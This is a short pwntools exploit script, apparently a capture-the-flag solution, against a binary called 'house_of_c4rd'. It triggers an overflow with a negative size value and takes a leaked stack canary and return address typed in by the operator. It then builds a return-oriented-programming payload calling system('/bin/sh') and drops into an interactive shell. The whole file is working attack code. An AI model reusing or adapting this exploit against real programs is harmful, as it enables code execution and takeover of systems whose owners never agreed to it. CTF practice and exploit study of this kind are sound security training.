#!/usr/bin/env python
from pwn import *

p = process('./house_of_c4rd')
# p = remote('localhost', 9999)
elf = ELF('./house_of_c4rd')
# gdb.attacg(p, '''b*0x555555555e6a
# set env REMOTE_HOST=127.0.0.1
# handle SIGALRM ignore
# c
# ''')
# context.log_level = 'debug'

def write(fn):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', fn)
def read(fn):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b': ', fn)
def goWrite(size, data, key):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'> ', size)
    p.sendlineafter(b'> ', data)
    p.sendlineafter(b'> ', key)
def goRead(key):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'> ', key)

write(b'aaaa')
goWrite(b'-1', b'a'*0x407 , b'yek')

canary = int(raw_input('canary = '), 16)
main_ret = int(raw_input('main_ret = '), 16)

pop1 = p64(main_ret + 0xbcb48)#0x44ad7f)
binsh = p64(main_ret + 0x165d26)
system = p64(main_ret + 0x226de)
log.info('pop1: ' + hex(u64(pop1)))
log.info('binsh: ' + hex(u64(binsh)))
log.info('system: ' + hex(u64(system)))

payload = b'a'*0x408 + p64(canary) + p64(0) + pop1 + binsh + system

write(b'file')
goWrite(b'-1', payload, b'yek')
# p.sendline(b'4')

p.interactive()
